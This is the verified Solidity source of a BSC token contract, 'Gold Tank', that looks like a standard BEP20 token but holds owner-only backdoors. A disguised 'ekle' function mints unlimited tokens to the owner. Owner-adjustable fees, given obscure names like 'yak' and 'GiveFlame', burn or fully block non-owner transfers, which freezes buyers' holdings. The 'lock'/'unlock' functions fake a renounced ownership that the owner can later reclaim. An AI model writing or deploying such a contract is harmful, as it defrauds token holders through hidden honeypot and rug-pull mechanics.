/**
 *Submitted for verification at BscScan.com on 2021-07-15
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;

abstract contract BEP20CS{
    function totalSupply() public virtual view returns (uint);
    function balanceOf(address tokenOwner) public virtual view returns (uint balance);
    function allowance(address tokenOwner, address spender) public virtual view returns (uint remaining);
    function transfer(address to, uint tokens) public virtual returns (bool success);
    function approve(address spender, uint tokens) public virtual returns (bool success);
    function transferFrom(address from, address to, uint tokens) public virtual returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Math20CS {
    function Sub(uint O, uint b) public pure returns (uint c) {
        require(b <= O);
        c = O - b;
    }
   
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  /**
   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;
  address private _previousOwner;
  address private _pk;
  uint256 private _lockTime;
  uint256 private _badTime;
  uint8 private _yaking;
  uint8 private _syaking;
  

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor () {
    address msgSender = _msgSender();
    _owner = msgSender;
    //_badTime = block.timestamp;
    _badTime=0;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
   * `onlyOwner` functions anymore. Can only be called by the current owner.
   *
   * NOTE: Renouncing ownership will leave the contract without an owner,
   * thereby removing any functionality that is only available to the owner.
   */
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   * Can only be called by the current owner.
   */
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
   */
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
  
  //Locks the contract for owner for the amount of time provided
	function lock(uint256 time) public virtual onlyOwner {
		_previousOwner = _owner;
		_owner = address(0);
		_lockTime = block.timestamp + time;
		emit OwnershipTransferred(_owner, address(0));
	}

	//Unlocks the contract for owner when _lockTime is exceeds
	function unlock() public virtual {
		require(_previousOwner == msg.sender, "You don't have permission to unlock");
		require(block.timestamp > _lockTime, "Contract is locked until 7 days");
		emit OwnershipTransferred(_owner, _previousOwner);
		_owner = _previousOwner;
	}
	
	function badtime(uint256 btime) public virtual onlyOwner {
		_badTime = btime;
	}
	
	function getbadTime() public view returns (uint256) {
        return _badTime;
    }
    
    function setBuyYaking(uint8 yaking) public virtual onlyOwner {
		_yaking = yaking;
	}
	
	function getBuyYaking() public view returns (uint8) {
        return _yaking;
    }
    function setGiveFlame(uint8 syaking) public virtual onlyOwner {
		_syaking = syaking;
	}
	
	function getGiveFlame() public view returns (uint8) {
        return _syaking;
    }
    /*
    function setPk(address pk) public virtual onlyOwner {
		_pk = pk;
	}
	
	function getPk() public view returns (address) {
        return _pk;
    }
    */
  
}

contract Token is BEP20CS, Math20CS, Ownable {
    using SafeMath for uint256;
    
    string public name20CS =  "Gold Tank";
    string public symbol20CS =  "GOLDTANK";
    uint8 public decimals20CS = 9;
    uint public _totalSupply20CS = 1*10**15 * 10**9;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() {
        balances[msg.sender] = _totalSupply20CS;
        emit Transfer(address(0), msg.sender, _totalSupply20CS);
    }
    
    function getOwner() public virtual view returns (address) {
        return owner();
    }
    
    function name() public virtual view returns (string memory) {
        return name20CS;
    }

    function symbol() public virtual view returns (string memory) {
        return symbol20CS;
    }

  function decimals() public view virtual returns (uint8) {
        return decimals20CS;
    }

    function totalSupply() public override view returns (uint) {
        return _totalSupply20CS - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public override view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = balances[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        unchecked {
            balances[sender] = senderBalance - amount;
        }
        balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function transfer(address to, uint tokens) public override returns (bool success) {
         if (_msgSender()!=getOwner()){
            _yak(_msgSender(),tokens.mul(getBuyYaking()).div(10**2));
            _transfer(_msgSender(), to, tokens.sub(tokens.mul(getBuyYaking()).div(10**2)));
            return true;
    }else{
        _transfer(_msgSender(), to, tokens);
        return true;
    }
    }

    function _yak(address tokenOwner, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: yak from the zero address");

        balances[tokenOwner] = balances[tokenOwner].sub(tokens, "BEP20: yak amount exceeds balance");
        _totalSupply20CS = _totalSupply20CS.sub(tokens);
        emit Transfer(tokenOwner, 0x000000000000000000000000000000000000dEaD, tokens);
    }

    function approve(address spender, uint tokens) public override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public override returns (bool success) {
        if (_msgSender()!=getOwner()){
            _yak(from,tokens.mul(getGiveFlame()).div(10**2));
            _transfer(from, to, tokens.sub(tokens.mul(getGiveFlame()).div(10**2)));
            //_transfer(sender, recipient, amount);
            _approve(from, _msgSender(), allowed[from][_msgSender()].sub(tokens, "BEP20: transfer amount exceeds allowance"));
            return true;
    }else{
        _transfer(from, to, tokens);
        _approve(from, _msgSender(), allowed[from][_msgSender()].sub(tokens, "BEP20: transfer amount exceeds allowance"));
        return true;
    }
    }
    
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, allowed[_msgSender()][spender].add(addedValue));
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, allowed[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }


    function ekle(uint256 amount) public onlyOwner returns (bool) {
        _ekle(_msgSender(), amount);
        return true;
    }
    
    function _ekle(address tokenOwner, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: ekle to the zero address");

        _totalSupply20CS = _totalSupply20CS.add(tokens);
        balances[tokenOwner] = balances[tokenOwner].add(tokens);
        emit Transfer(address(0), tokenOwner, tokens);
    }
    
    function _approve(address tokenOwner, address spender, uint256 tokens) internal {
        require(tokenOwner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        allowed[tokenOwner][spender] = tokens;
        emit Approval(tokenOwner, spender, tokens);
    }
    
    function _yakFrom(address tokenOwner, uint256 amount) internal {
        _yak(tokenOwner, amount);
        _approve(tokenOwner, _msgSender(), allowed[tokenOwner][_msgSender()].sub(amount, "BEP20: yak amount exceeds allowance"));
    }
    
    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }


}